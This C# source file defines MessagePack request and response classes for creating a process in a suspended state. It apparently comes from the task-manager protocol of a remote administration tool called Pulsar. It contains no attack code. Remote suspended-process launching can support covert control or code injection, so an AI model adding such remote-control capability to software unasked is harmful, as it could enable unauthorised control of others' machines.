using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    // -------------------------------
    // Request: Create process suspended
    // -------------------------------
    [MessagePackObject]
    public class DoCreateProcessSuspended : IMessage
    {
        [Key(1)]
        public string Path { get; set; }
    }

    // ----------------------------------------
    // Response: Confirmation & optional error
    // ----------------------------------------
    [MessagePackObject]
    public class DoCreateProcessSuspendedResponse : IMessage
    {
        [Key(1)]
        public bool Result { get; set; }

        [Key(2)]
        public string Error { get; set; }
    }
}
